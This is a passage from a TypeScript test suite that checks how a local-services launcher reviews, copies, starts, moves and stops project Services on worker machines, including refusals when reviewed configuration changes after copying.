                expect(environmentObservation.signal?.aborted).toBe(false);
            }
            await expect(handle.stop()).rejects.toMatchObject({ code: 'plugin_managed_server_termination_incomplete' });
            expect(h.owner.listProjectServices()).toEqual([handle]);
            expect(environmentObservation.signal?.aborted).toBe(false);
        } finally { terminate.mockRestore(); }
        if (capturedTree) {
            // Restoring the OS adapter cannot manufacture custody. The real
            // Service Stop must still retain the environment while this known
            // survivor exists; settle only the fixture's captured generations.
            await expect(handle.stop()).rejects.toMatchObject({ code: 'plugin_managed_server_termination_incomplete' });
            expect(h.owner.listProjectServices()).toEqual([handle]);
            expect(environmentObservation.signal?.aborted).toBe(false);
            expect(await processTreeBoundary.terminateProcessTree({ targets: capturedTree.capturedTargets, tree: false }))
                .toMatchObject({ status: 'complete' });
        }
        await handle?.stop();
        expect(h.owner.listProjectServices()).toEqual([]);
        expect(environmentObservation.signal?.aborted).toBe(true);
    });

    it('revalidates the selected Service after review and never runs changed bytes', async () => {
        const h = await fixture();
        const review = await h.selectStart();
        const request = { ...h.request, expectedEffectDigest: review.reviewedEffectDigest };
        const resolved = await h.starter.resolveStartTarget(request, h.ingress, h.context);
        if (!resolved.ok) throw new Error(resolved.reasonCode);
        await writeFile(join(h.root, '.happier/project.json'), JSON.stringify({ ...h.manifest, services: { worker: { source: { kind: 'command', command: 'echo changed' } } } }));
        expect(await h.starter.startManagedDeclaration(resolved.declaration, request, h.ingress, h.context)).toMatchObject({ status: 'denied', reasonCode: 'project_service_effect_changed' });
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it('receives an immutable portable SOURCE, copies only during Start, and publishes actual worker custody without a finite slot', async () => {
        const h = await fixture(false, undefined, false, 'portable');
        h.publishSource(false);
        expect(await h.routes.startTarget!(h.request, h.ingress, h.context)).toMatchObject({ status: 'denied', reasonCode: 'access_denied' });
        expect(h.copies()).toBe(0);
        expect(h.owner.listProjectServices()).toEqual([]);
        h.publishSource(true);
        h.mintSourceEpoch(2);
        expect(await h.routes.startTarget!(h.request, h.ingress, h.context)).toMatchObject({ status: 'denied', reasonCode: 'admission_unavailable' });
        expect(h.copies()).toBe(0);
        h.mintSourceEpoch(1);
        const review = await h.selectStart();
        expect(review).toMatchObject({ reviewedEffectDigest: expect.any(String) });
        expect(h.copies()).toBe(0);
        expect(h.owner.listProjectServices()).toEqual([]);
        if (!review.reviewedEffectDigest) throw new Error('Expected SOURCE effect review');
        const result = await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context);
        expect(result).toMatchObject({ status: 'succeeded', machineId: 'worker-machine', snapshot: {
            machineId: 'worker-machine', targets: [expect.objectContaining({ serviceState: 'running', workspaceId: h.targetWorkspace.id })] } });
        expect(h.copies()).toBe(1);
        expect(h.request.workspace).toMatchObject({ machineId: 'machine', workspaceId: h.workspace.id, rootPath: h.root });
        const handle = h.owner.listProjectServices()[0]!;
        const declaration = { workspaceRefId: h.targetWorkspace.id, selection: h.request.declaration.selection };
        expect(result.currentTarget).toEqual({ kind: 'managed_service', managedServiceId: handle.instanceId,
            machineId: h.targetWorkspace.machineId, workspaceId: h.targetWorkspace.id, cwd: h.targetRoot, declaration });
        expect(handle).toMatchObject({ workspace: h.targetWorkspace, declaration, cwd: h.targetRoot,
            serviceId: createProjectServiceDeclarationTargetIdV1(h.targetWorkspace, declaration.selection) });
        expect(handle.snapshot()).toMatchObject({ state: 'running', baseUrl: null });
        expect(h.setupProcesses).toEqual([]);
        await handle.stop();
    });

    it('reviews clean destination-native package facts and starts the portable Service through the existing supervisor', async () => {
        const h = await fixture(false, { kind: 'native', tool: 'package_script', file: 'package.json', target: 'dev' }, false, 'portable');
        await writeFile(join(h.root, 'package.json'), JSON.stringify({ name: 'package', scripts: { dev: 'native service' } }));
        h.setNativeTool({ executablePath: process.execPath, args: ['-e', 'setInterval(() => {}, 1000)', '--'] });
        // Selection owns Sync preparation; approval reads the resulting native
        // destination facts without transferring or launching anything itself.
        await h.selectStart();
        const selectedCopies = h.copies();
        const review = LocalServiceStartApprovalReviewV1Schema.parse(await h.starter.prepareStartApproval(h.request, h.ingress, h.context));
        expect(review).toMatchObject({ reviewedEffectDigest: expect.any(String), reviewedEffect: {
            command: { args: ['-e', 'setInterval(() => {}, 1000)', '--', 'run', 'dev'], cwd: '.' },
            files: [expect.objectContaining({ file: 'package.json' })],
        } });
        expect(selectedCopies).toBeGreaterThan(0);
        expect(h.copies()).toBe(selectedCopies);
        expect(h.owner.listProjectServices()).toEqual([]);
        h.post.mockClear();
        const previousCopies = h.copies();
        const started = await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context);
        expect(DaemonLocalServiceLauncherStartResponseV1Schema.parse(started)).toMatchObject({ status: 'succeeded', currentTarget: {
            machineId: h.targetWorkspace.machineId, workspaceId: h.targetWorkspace.id, cwd: h.targetRoot,
        } });
        const handle = h.owner.listProjectServices()[0]!;
        expect(handle.snapshot()).toMatchObject({ state: 'running', baseUrl: null });
        expect(h.runtime.workerAdmission.dependencies()).toEqual([]);
        expect(h.setupProcesses).toEqual([]);
        // Selection and execution retain this request's one SOURCE review;
        // subsequent target checks compare actual copied bytes to that basis.
        expect(h.post.mock.calls.filter(([url]) => String(url).endsWith('/v1/actions/projects.inspect'))).toHaveLength(1);
        for (const [, body] of h.post.mock.calls.filter(([url]) => String(url).endsWith('/v1/actions/projects.inspect'))) {
            const request = ExternalActionExecutionAuthorizationRequestV1Schema.parse(body);
            expect(ExternalActionRequestEnvelopeV1Schema.parse(request.envelope).input).toMatchObject({
                read: { kind: 'execution', command: { usage: 'service', name: h.request.declaration.selection.kind === 'manifest'
                    ? h.request.declaration.selection.name : undefined } },
            });
        }
        expect(h.copies() - previousCopies).toBe(2);
        await handle.stop();
    });

    it('reviews and prepares a nonhost worker Service on the actual destination without a host fallback', async () => {
        const script = 'require("node:fs").writeFileSync("service-facts.json", JSON.stringify({cwd:process.cwd(),nativeRoot:process.env.SERVICE_NATIVE_ROOT})); setInterval(() => {}, 1000)';
        const h = await fixture(false, { kind: 'command', command: `${JSON.stringify(process.execPath)} -e ${JSON.stringify(script)}` }, true, 'portable', 'home', 'home', undefined,
            { kind: 'toolchain', tool: 'mise', configPath: 'mise.toml' });
        await writeFile(join(h.root, 'mise.toml'), '[env]\nSERVICE_NATIVE_ROOT = "destination"\n');
        const { findBuiltinNativeToolchainAdapterV1 } = await import('@happier-dev/protocol/plugins/contributions/projectNativeAdapters');
        const version = findBuiltinNativeToolchainAdapterV1('mise', 'linux')!.nativeVersion;
        h.setNativeTool({ executablePath: process.execPath, version });
        const environmentRoots = join(h.targetRoot, 'environment-roots.jsonl');
        // Substitute the installed native executable only. Its process,
        // invocation custody and complete-environment producer remain real.
        Object.assign(h.runtime, { environmentIo: createProjectNativeToolchainIoForHost({ resolveTool: async () => ({
            executablePath: process.execPath, version, args: ['-e',
                'require("node:fs").appendFileSync("environment-roots.jsonl",JSON.stringify(process.cwd())+"\\n");process.stdout.write("SERVICE_NATIVE_ROOT="+process.cwd()+"\\0");', '--'],
        }) }) });
        const setupReview = await h.routes.startTarget!(h.request, h.ingress, h.context);
        expect(setupReview).toMatchObject({ status: 'denied', reasonCode: 'project_setup_consent_required' });
        await expect(readFile(environmentRoots, 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
        h.trustSetupDigest(setupReview.reviewedEffectDigest!);
        const review = await h.selectStart();
        expect(review).toMatchObject({ reviewedEffectDigest: expect.any(String) });
        const started = await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context);
        expect(started.reasonCode).toBeUndefined();
        expect(started).toMatchObject({ status: 'succeeded' });
        await expect.poll(async () => {
            try { return JSON.parse(await readFile(join(h.targetRoot, 'service-facts.json'), 'utf8')); }
            catch { return null; }
        }).toEqual({ cwd: h.targetRoot, nativeRoot: h.targetRoot });
        const environments: unknown[] = (await readFile(environmentRoots, 'utf8')).trim().split('\n').map(line => JSON.parse(line));
        expect(environments.length).toBeGreaterThan(0);
        expect(environments.every(root => root === h.targetRoot)).toBe(true);
        await h.owner.listProjectServices()[0]?.stop();
    });

    it('refuses an unavailable portable native Move destination before stopping SOURCE', async () => {
        const h = await fixture(false, { kind: 'native', tool: 'package_script', file: 'package.json', target: 'dev' }, true, 'portable');
        await writeFile(join(h.root, 'package.json'), JSON.stringify({ scripts: { dev: 'native service' } }));
        h.setNativeTool({ executablePath: process.execPath, args: ['-e', 'setInterval(() => {}, 1000)', '--'] });
        const started = await seedWorkerService(h, h.workspace);
        const old = h.owner.listProjectServices()[0]!;
        const common = { token: h.runtime.credentials!.token, credentials: h.runtime.credentials!, serverId: 'home', serverIdentityId: h.serverIdentityId,
            serverHttpBaseUrl: 'https://home.example', sessionId: 'cli-global', mode: 'plain' as const, ctx: null,
            pluginActionExecutionOwner: 'current_process' as const };
        const worker = createCliActionExecutor({ ...common, runtimeActionMachineId: h.targetWorkspace.machineId,
            projectWorkerAction: createProjectWorkerAction({ machineId: h.targetWorkspace.machineId, serverId: 'home',
                serverHttpBaseUrl: 'https://home.example', credentials: h.runtime.credentials!, accountId: 'owner',
                admission: h.runtime.workerAdmission, isFiniteExecutionLive: () => false, isServiceExecutionLive: () => false }) });
        const workerRpc = new RpcHandlerManager({ scopePrefix: h.targetWorkspace.machineId,
            localMachineId: h.targetWorkspace.machineId, encryptionMode: 'plain' });
        registerActionSpecRpcHandlers({ rpcHandlerManager: workerRpc, actionIds: ['projects.worker.status'],
            targetMachineId: h.targetWorkspace.machineId, defaultMachineTarget: true, actionExecutor: worker });
        h.bindWorkerStatusTransport((envelope, signal) => {
            if (!envelope.target) throw new Error('Destination worker Status requires its exact target');
            return workerRpc.invokeLocal(getActionSpec('projects.worker.status').bindings!.rpcMethod!,
                createTargetedActionRpcRequestV1(envelope.input, envelope.target), { signal: signal ?? h.ingress.signal,
                    rpcContext: h.ingress });
        });
        vi.spyOn(machineRpcBoundary, 'callExactMachineRpc').mockImplementation(async call => {
            expect(call.machineId).toBe(h.targetWorkspace.machineId);
            expect(call.method).toBe(getActionSpec('projects.worker.status').bindings!.rpcMethod);
            return await workerRpc.invokeLocal(call.method, call.request, { signal: call.signal ?? h.ingress.signal,
                rpcContext: h.ingress });
        });
        let content: WorkspaceExecutionConfigContentV1 | null = null;
        let revision = 0;
        vi.spyOn(axios, 'request').mockImplementation(async config => {
            const path = new URL(String(config.url)).pathname;
            if (path === '/v1/account/encryption') return { status: 200, data: { mode: 'plain', updatedAt: 1 } };
            if (path === '/v1/projects/execution/config/read') return { status: 200, data: content
                ? { status: 'present', revision, content } : { status: 'absent' } };
            expect(path).toBe('/v1/projects/execution/config/mutate');
            content = WorkspaceExecutionConfigMutationRequestV1Schema.parse(config.data).content;
            return { status: 200, data: { status: 'updated', revision: ++revision, cursor: revision } };
        });
        // The adapter's reached method is the real Sync route above; unrelated
        // handoff/session operations cannot be used as an alternate copier.
        const handoff: WorkspaceSyncHandoffAdapter = { prepareBetween: h.prepareBetween,
            async prepare() { throw new Error('Move does not prepare a Session handoff'); },
            async finalize() { throw new Error('Move does not finalize a Session handoff'); },
            async commit() { throw new Error('Move does not commit a Session handoff'); },
            async abort() { throw new Error('Move does not abort a Session handoff'); } };
        const sourceIngress = { ...h.ingress, machineAdmission: { ...h.ingress.machineAdmission!, machineId: h.workspace.machineId } };
        const source = createCliActionExecutor({ ...common, runtimeActionMachineId: h.workspace.machineId,
            accountServerActionDeps: createAccountServerActionDeps(common),
            runtimeActionExecute: await h.createRuntimeActionExecutor(createProjectServiceRelocationRoute({
                serverBaseUrl: 'https://home.example', credentials: h.runtime.credentials!, projectManagedServices: h.owner,
                resolveWorkspaceSyncHandoffAdapter: () => handoff }), undefined, h.routes, sourceIngress) });
        const workspace = { serverId: 'home', refId: h.workspace.id };
        const destination = { kind: 'workers' as const, destination: { kind: 'machine' as const, machineId: h.targetWorkspace.machineId } };
        const request = { workspace, sourceMachineId: h.workspace.machineId, serviceName: 'worker', requestId: 'native-source-worker-move', currentTarget: started.currentTarget,
            destination, selectedTarget: { machineId: h.targetWorkspace.machineId }, desiredPlacement: { workspace, serviceName: 'worker',
                expectedRevision: 'absent' as const, expected: { kind: 'absent' as const }, value: { runsOn: destination, unavailable: 'fail' as const } } };
        const approved = await approvedMoveContext(h, request);
        const phases: string[] = [];
        const operations = createHostActionOperationRuntime({ machineId: h.workspace.machineId, resolveAccountId: async () => 'owner',
            generateOperationId: () => 'native-move', supportsCoreCancellation: () => true });
        let result: Awaited<ReturnType<typeof source.execute>> | undefined;
        await operations.observeExecution({ actionId: 'projects.service.relocate', input: request, execute: async context => {
            result = await source.execute('projects.service.relocate', request, { ...h.context, ...context, ...approved, surface: 'cli',
                operationProgress: { update(update) { context.operationProgress.update(update); if (update.phase) phases.push(update.phase); } } });
            return result;
        } });
        await operations.runner.waitForTerminal({ accountId: 'owner', machineId: h.workspace.machineId }, 'native-move');
        expect(result).toMatchObject({ ok: false, errorCode: 'project_worker_unsupported' });
        expect(old.snapshot().state).toBe('running');
        expect(phases).toEqual([]);
        expect(h.copies()).toBe(0);
    });

    it('refuses native worker configuration changed by the copy before any service is launched', async () => {
        const h = await fixture(false, { kind: 'native', tool: 'package_script', file: 'package.json', target: 'dev' }, false, 'portable');
        await writeFile(join(h.root, 'package.json'), JSON.stringify({ scripts: { dev: 'reviewed service' } }));
        h.setNativeTool({ executablePath: process.execPath, args: ['-e', 'setInterval(() => {}, 1000)', '--'] });
        h.afterCopy(() => writeFile(join(h.targetRoot, 'package.json'), JSON.stringify({ scripts: { dev: 'different service' } })));
        expect(await h.routes.startTarget!(h.request, h.ingress, h.context)).toMatchObject({ status: 'denied', reasonCode: 'project_service_effect_changed' });
        expect(h.owner.listProjectServices()).toEqual([]);
        expect(h.setupProcesses).toEqual([]);
    });

    it('refuses a receiving primary-only SOURCE before copy or setup consent', async () => {
        const h = await fixture(true, undefined, false, 'primary');
        expect(await h.routes.startTarget!(h.request, h.ingress, h.context)).toMatchObject({ status: 'denied', reasonCode: 'primary_only' });
        expect(h.copies()).toBe(0);
        expect(h.setupProcesses).toEqual([]);
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it('runs fresh worker setup once from the exact admitted Move review without a second prepare', async () => {
        const h = await fixture(true, undefined, true, 'portable');
        const inspection = ProjectDefinitionInspectOutputSchema.parse(await h.projectDefinitionActionFor(h.workspace)({
            actionId: 'projects.inspect', input: { workspace: { serverId: h.workspace.serverId,
                machineId: h.workspace.machineId, workspaceId: h.workspace.id, rootPath: h.root }, read: { kind: 'setup' } }, context: h.context }));
        if (!inspection.setupReview) throw new Error('Expected incoming setup review');
        const workspace = { serverId: h.workspace.serverId, refId: h.workspace.id };
        const destination = { kind: 'workers', destination: { kind: 'machine', machineId: h.targetWorkspace.machineId } };
        const move = { workspace, sourceMachineId: h.workspace.machineId, serviceName: 'worker', requestId: 'move-with-setup',
            currentTarget: { kind: 'managed_service', managedServiceId: 'old', machineId: h.workspace.machineId,
                workspaceId: h.workspace.id, declaration: h.request.declaration }, destination,
            selectedTarget: { machineId: h.targetWorkspace.machineId }, setupReview: inspection.setupReview,
            desiredPlacement: { workspace, serviceName: 'worker', expectedRevision: 'absent', expected: { kind: 'absent' },
                value: { runsOn: destination, unavailable: 'fail' } } };
        // Host issuance is the real compound approval seam; only native process and HTTP IO are substituted.
        const completion = invokeHostReviewedChildV1({ parent: { actionId: 'projects.service.relocate', input: JSON.parse(JSON.stringify(move)) },
            context: { ...h.context, surface: 'agent' }, child: { action: 'localServices.launcher.start',
                role: 'service.localServices.launcher.start', input: JSON.parse(JSON.stringify(h.request)) },
            admittedReview: { action: 'localServices.launcher.start', role: 'service.localServices.launcher.start', surface: 'agent' },
            execute: async (_request, context) => h.routes.startTarget!(h.request, h.ingress, context) });
        // Wait on the admitted setup PTY's exit subscription, not a wall-clock poll.
        await Promise.race([h.setupStarted, completion]);
        expect(h.setupProcesses).toHaveLength(1);
        expect(h.copies()).toBe(1);
        expect(h.setupProcesses[0]?.params).toMatchObject({ options: { cwd: h.targetRoot } });
        h.setupProcesses[0]!.pty.exit(0);
        expect(await completion).toMatchObject({ status: 'succeeded' });
        expect(h.setupProcesses).toHaveLength(1);
        expect(h.post.mock.calls.some(([url]) => String(url).endsWith('/project-trust/mutate'))).toBe(false);
        await h.owner.listProjectServices()[0]?.stop();
    });

    it('holds real worker setup review in the same operation, resumes after Remember, and releases its slot before service custody', async () => {
        const h = await fixture(true, undefined, true, 'portable');
        const reviewed = await h.selectStart();
        if (!reviewed.reviewedEffectDigest) throw new Error('Expected SOURCE service review');
        const request = { ...h.request, expectedEffectDigest: reviewed.reviewedEffectDigest };
        const completion = h.routes.startTarget!(request, h.ingress, h.context);
        const scope = { accountId: 'owner', machineId: h.targetWorkspace.machineId };
        await Promise.race([h.operationPublished(snapshot => snapshot.operationId === 'setup-operation'
            && snapshot.setupReview?.code === 'project_setup_consent_required'), completion]);
        const pending = h.operationRuntime.store.get(scope, 'setup-operation')!;
        expect(h.operationRuntime.store.list(scope).items.find(item => item.actionId === 'localServices.launcher.start'))
            .toMatchObject({ state: 'running', progress: { phase: 'preparing' } });
        expect(h.copies()).toBe(1);
        expect(h.setupProcesses).toEqual([]);
        expect(h.owner.listProjectServices()).toEqual([]);
        expect(h.runtime.workerAdmission.dependencies()).toMatchObject([{ operationId: 'setup-operation', state: 'setup' }]);
        h.trustSetupDigest(pending.setupReview!.reviewedEffectDigest);
        // Exact original-request replay wakes the incumbent review owner; no new Start or reservation is submitted.
        await h.operationRuntime.observeExecution({ actionId: 'projects.prepare',
            input: { workspace: h.request.workspace, phase: 'setup' }, rpcContext: h.ingress,
            actionRequestId: h.context.actionRequestId, execute: async () => { throw new Error('Replay must keep the original setup closure'); } });
        await Promise.race([h.setupStarted, completion]);
        expect(h.setupProcesses).toHaveLength(1);
        expect(h.setupProcesses[0]?.params).toMatchObject({ options: { cwd: h.targetRoot } });
        h.setupProcesses[0]!.pty.exit(0);
        expect(await completion).toMatchObject({ status: 'succeeded' });
        expect(h.runtime.workerAdmission.dependencies()).toEqual([]);
        expect(h.operationRuntime.store.list(scope).items.map(item => item.actionId).sort())
            .toEqual(['localServices.launcher.start', 'projects.prepare']);
        await h.owner.listProjectServices()[0]?.stop();
    });

    it('refuses copied declaration drift and a withdrawn exact route without native launch', async () => {
        const h = await fixture(false, undefined, false, 'portable');
        const review = await h.selectStart();
        if (!review.reviewedEffectDigest) throw new Error('Expected SOURCE effect review');
        h.changeCopiedManifest({ ...h.manifest, services: { worker: { ...h.manifest.services!.worker,
            source: { kind: 'command', command: 'echo changed' } } } });
        const request = { ...h.request, expectedEffectDigest: review.reviewedEffectDigest };
        expect(await h.routes.startTarget!(request, h.ingress, h.context)).toMatchObject({ status: 'failed', reasonCode: 'project_service_effect_changed' });
        expect(h.copies()).toBe(1);
        expect(h.owner.listProjectServices()).toEqual([]);
        h.withdrawRelationship();
        expect(await h.routes.startTarget!(request, h.ingress, h.context)).toMatchObject({ status: 'denied' });
        expect(h.copies()).toBe(1);
        expect(h.owner.listProjectServices()).toEqual([]);
    });

    it.each(['platform', 'configEnvironment'] as const)('binds the receiving %s to SOURCE review and refuses its change after copy', async fact => {
        const h = await fixture(false, undefined, false, 'portable');
        const review = await h.selectStart();
        if (!review.reviewedEffectDigest) throw new Error('Expected SOURCE effect review');
        h.afterCopy(() => { Object.assign(h.runtime, fact === 'platform' ? { platform: 'darwin' } : { configEnvironment: { PORT: 'changed' } }); });
        expect(await h.routes.startTarget!({ ...h.request, expectedEffectDigest: review.reviewedEffectDigest }, h.ingress, h.context))
            .toMatchObject({ status: 'failed', reasonCode: 'project_service_effect_changed' });
        expect(h.copies()).toBe(1);
        expect(h.owner.listProjectServices()).toEqual([]);
        expect(h.setupProcesses).toEqual([]);
    });

    it('refuses a new no-finite-prerequisite worker Service when the actual daemon drains before or during copy', async () => {
        const h = await fixture(false, undefined, false, 'portable');
        const review = await h.selectStart();
        if (!review.reviewedEffectDigest) throw new Error('Expected SOURCE effect review');
        const request = { ...h.request, expectedEffectDigest: review.reviewedEffectDigest };
        const releaseDrain = h.admissionDrain.beginTemporaryDrain();
        expect(await h.routes.startTarget!(request, h.ingress, h.context)).toMatchObject({ status: 'denied', reasonCode: 'draining' });
        expect(h.copies()).toBe(0);
        expect(h.owner.listProjectServices()).toEqual([]);
        releaseDrain();
        h.afterCopy(() => { h.admissionDrain.beginTemporaryDrain(); });
        expect(await h.routes.startTarget!(request, h.ingress, h.context)).toMatchObject({ status: 'failed', reasonCode: 'draining' });
        expect(h.copies()).toBe(1);
        expect(h.owner.listProjectServices()).toEqual([]);
        expect(h.setupProcesses).toEqual([]);
        expect(h.runtime.workerAdmission.dependencies()).toEqual([]);
    });

    it.each(['explicit', 'saved', 'withdrawn_after_copy'] as const)('uses current canonical pool membership at the receiving worker without reranking (%s)', async scenario => {
        const h = await fixture(false, undefined, false, 'portable');
        const poolId = '99d55938-f860-4af8-8023-01fecec86f35';
        let members: MachinePoolPrivateViewV1['pool']['members'] = [
            { machineId: 'higher-priority-machine', priorityTier: 0, enabled: true, state: 'connected' },
            { machineId: h.targetWorkspace.machineId, priorityTier: 1, enabled: true, state: 'connected' },
        ];
        // Only authenticated Home HTTP is replaced: canonical pool Action/codec and native Action execution remain real.
        vi.spyOn(axios, 'request').mockImplementation(async config => {
            expect(config.headers).toMatchObject({ Authorization: `Bearer ${h.runtime.credentials.token}` });
            if (config.url === 'https://home.example/v1/account/encryption') return { status: 200, data: { mode: 'plain', updatedAt: 1 } };
            expect(config.url).toBe('https://home.example/v1/machines/pools/get');
            expect(config.method).toBe('POST');
            expect(config.data).toEqual({ poolId });
            // Home returns recipient projections; the canonical Action opens them before receiving admission.
            const view: MachinePoolPrivateViewV1 = { pool: { id: poolId, name: { kind: 'available', label: { content: { t: 'plain', v: 'Workers' }, recipientEnvelope: null } }, description: null, revision: 1, createdAt: 1, updatedAt: 1, members },
                availability: { state: 'known', connectedCount: members.length, enabledCount: members.length } };
            return { status: 200, data: view };
        });
        const gate = createLocalServicesDaemonFeatureGate({ env: {}, resolveServerFeaturesSnapshot: () => ({ status: 'ready',
            features: FeaturesResponseSchema.parse({ features: { localServices: { enabled: true, inventory: { enabled: true }, launcher: { enabled: true },
                managed: { enabled: true }, actions: { enabled: true } }, browser: { enabled: true, viewTargets: { enabled: true } } }, capabilities: {} }) }) });
        await gate.refresh();
        expect(gate.isEnabled('localServices.launcher')).toBe(true);
        const executor = createCliActionExecutorFromCredentials({ credentials: h.runtime.credentials, serverId: 'home',
            serverApiUrl: 'https://home.example', machineId: h.targetWorkspace.machineId, pluginActionExecutionOwner: 'current_process',
            readCredentials: async () => h.runtime.credentials,
            runtimeActionExecute: createLocalServicesDaemonRuntimeActionExecutor({ featureGate: gate, ingress: h.ingress,
                routes: { launcherRoutes: h.routes } }) });
        const choice = { kind: 'workers' as const, destination: { kind: 'pool' as const, poolId, selection: 'automatic' as const } };
        h.savePlacement({ runsOn: choice, unavailable: 'fail' });
        const { choice: exactChoice, ...sourceRequest } = h.request;
        expect(exactChoice).toMatchObject({ destination: { machineId: h.targetWorkspace.machineId } });
        const request = { ...sourceRequest, ...(scenario === 'saved' ? {} : { choice }) };
        const context = { surface: 'cli' as const, authority: 'present_user' as const,
            presentUserConfirmation: { actionId: 'localServices.launcher.start' as const }, actionRequestId: 'pool-native-start' };
        // Explicit human confirmation satisfies the invocation's changeable
        // approval default. Pool custody still has to hold after the copy.
        expect(h.copies()).toBe(0);
        expect(h.owner.listProjectServices()).toEqual([]);
        if (scenario === 'withdrawn_after_copy') h.afterCopy(() => { members = members.filter(member => member.machineId !== h.targetWorkspace.machineId); });
        const started = await executor.execute('localServices.launcher.start', request, context);
        expect(started).toMatchObject({ ok: true, result: scenario === 'withdrawn_after_copy'
            ? { status: 'failed', reasonCode: 'target_not_local' }
            : { status: 'succeeded', currentTarget: { machineId: h.targetWorkspace.machineId, workspaceId: h.targetWorkspace.id } } });
        expect(h.copies()).toBe(1);
        expect(request.workspace).toEqual(h.request.workspace);
        expect(request.declaration.workspaceRefId).toBe(h.workspace.id);
        expect(request.choice).toEqual(scenario === 'saved' ? undefined : choice);
        expect(h.setupProcesses).toEqual([]);
        if (scenario === 'withdrawn_after_copy') expect(h.owner.listProjectServices()).toEqual([]);
        else await h.owner.listProjectServices()[0]?.stop();
    });

    it('refuses a primary-only worker choice before requesting setup consent or starting a service', async () => {
        const h = await fixture(true);
        const request = { ...h.request, choice: { kind: 'workers' as const,
            destination: { kind: 'machine' as const, machineId: 'worker-machine' } } };
        expect(await h.starter.resolveStartTarget(request, h.ingress, h.context))
            .toMatchObject({ ok: false, reasonCode: 'primary_only' });
        expect(h.owner.listProjectServices()).toEqual([]);
        expect(h.setupProcesses).toEqual([]);
    });

    it('starts a service with no finite prerequisite when finite admission is off', async () => {
        const h = await fixture(false, undefined, false);
        const review = await h.selectStart();
        const request = { ...h.request, expectedEffectDigest: review.reviewedEffectDigest };
        const selected = await h.starter.resolveStartTarget(request, h.ingress, h.context);
        if (!selected.ok) throw new Error(selected.reasonCode);
        expect(await h.starter.startManagedDeclaration(selected.declaration, request, h.ingress, h.context))
            .toMatchObject({ status: 'succeeded' });
        expect(h.setupProcesses).toEqual([]);
        expect(h.owner.listProjectServices()[0]?.snapshot()).toMatchObject({ state: 'running', baseUrl: null });
        await h.owner.listProjectServices()[0]?.stop();
    });

    it('starts an accepted native package declaration with the actual resolved executable and argv', async () => {
        // A manifest-owned native source has no duplicate detected row; leave dev unclaimed for direct-native admission.
        const h = await fixture(false);
        await writeFile(join(h.root, 'package.json'), JSON.stringify({ name: 'package', scripts: { dev: 'package-authored server command' } }));
        // A system-tool wrapper is a genuine OS resolution boundary. The native codec must retain its argv prefix.
        h.setNativeTool({ executablePath: process.execPath, args: ['-e', 'setInterval(() => {}, 1000)', '--'] });
        const directTargets = (await discoverLocalServiceRunTargets({ roots: [], acceptedWorkspaceRefs: [h.workspace] })).targets;
        const target = directTargets.find(target => 'declaration' in target && target.declaration.selection.kind === 'native'
            && target.declaration.selection.source.kind === 'native' && target.declaration.selection.source.tool === 'package_script');
        if (!target || !('declaration' in target)) throw new Error('Expected direct accepted package declaration');
        const selectedRequest = { ...h.request, targetId: target.id, declaration: target.declaration };
        const review = LocalServiceStartApprovalReviewV1Schema.parse(await h.starter.prepareStartApproval(selectedRequest, h.ingress, h.context));
        expect(review).toMatchObject({ reviewedEffectDigest: expect.any(String), reviewedEffect: {
            command: { args: ['-e', 'setInterval(() => {}, 1000)', '--', 'run', 'dev'] },
        } });
        if (!review.reviewedEffectDigest) throw new Error('Expected native effect review');
        const request = { ...selectedRequest, expectedEffectDigest: review.reviewedEffectDigest };
        expect(await h.routes.startTarget!(request, h.ingress, h.context)).toMatchObject({ status: 'succeeded' });
        expect(h.owner.listProjectServices()[0]?.snapshot()).toMatchObject({ state: 'running', baseUrl: null });
        await h.owner.listProjectServices()[0]?.stop();
    });

    it.skipIf(!process.env.FX19_FLOX_PATH)('qualifies installed owned Flox activation through declaration start, logs, native stop and owner restart', async ({ onTestFailed }) => {
        let phase = 'fixture';
        let observation: unknown;
        onTestFailed(() => { console.error(`FX19 native fixture failed during ${phase}`, observation); });
        const flox = process.env.FX19_FLOX_PATH!;
        const h = await fixture(false, { kind: 'native', tool: 'flox', file: '.flox/env/manifest.toml', target: 'worker' });
        const io = createProjectNativeToolchainIoForHost({ resolveTool: async () => ({ executablePath: flox, version: '1.18.1-gf264cf2' }) });
        const env: Record<string, string> = {};
        for (const [key, value] of Object.entries(process.env)) if (value !== undefined) env[key] = value;
        Object.assign(h.runtime, { hostEnvironment: env, environmentIo: io });
        h.setNativeTool({ executablePath: flox });
        const native = (args: readonly string[]) => io.run({ command: flox, args, cwd: h.root, env });
        phase = 'Flox init';
        expect((await native(['init', '--bare', '--no-auto-setup', '--dir', h.root, '--name', 'fx19-service'])).exitCode).toBe(0);
        await writeFile(join(h.root, '.flox/env/manifest.toml'), 'version = 1\n[services.worker]\ncommand = "echo fx19-service-output; while true; do sleep 1; done"\n[services.other]\ncommand = "echo fx19-unselected; while true; do sleep 1; done"\n');
        const status = async () => {
            const result = await native(['services', 'status', '--dir', h.root, '--json']);
            expect(result.exitCode).toBe(0);
            const services = JSON.parse(result.stdout) as Array<{ name: string; status: string; pid: number | null }>;
            observation = services;
            return services;
        };
        try {
            phase = 'effect review';
            const review = await h.selectStart();
            expect(review).toMatchObject({ reviewedEffectDigest: expect.any(String) });
            if (!review.reviewedEffectDigest) throw new Error('Expected Flox Service review');
            const request = { ...h.request, expectedEffectDigest: review.reviewedEffectDigest };
            phase = 'admitted Start';
            expect(await h.routes.startTarget!(request, h.ingress, h.context)).toMatchObject({ status: 'succeeded' });
            const handle = h.owner.listProjectServices()[0]!;
            expect(handle.snapshot()).toMatchObject({ state: 'running', mode: 'spawn', baseUrl: null });
            phase = 'native Running observation';
            await expect.poll(async () => (await status()).find(service => service.name === 'worker')?.status, { timeout: 30_000 }).toBe('Running');
            expect((await status()).find(service => service.name === 'other')?.status).toBe('Disabled');
            phase = 'native logs';
            expect((await native(['services', 'logs', '--dir', h.root, 'worker'])).stdout).toContain('fx19-service-output');
            expect(h.setupProcesses).toEqual([]);
            phase = 'native Stop';
            expect((await native(['services', 'stop', '--dir', h.root, 'worker'])).exitCode).toBe(0);
            await expect.poll(() => handle.snapshot().state, { timeout: 30_000 }).toBe('stopped');
            expect(await handle.stop()).toEqual({ status: 'stopped' });
            phase = 'fresh Start after Stop';
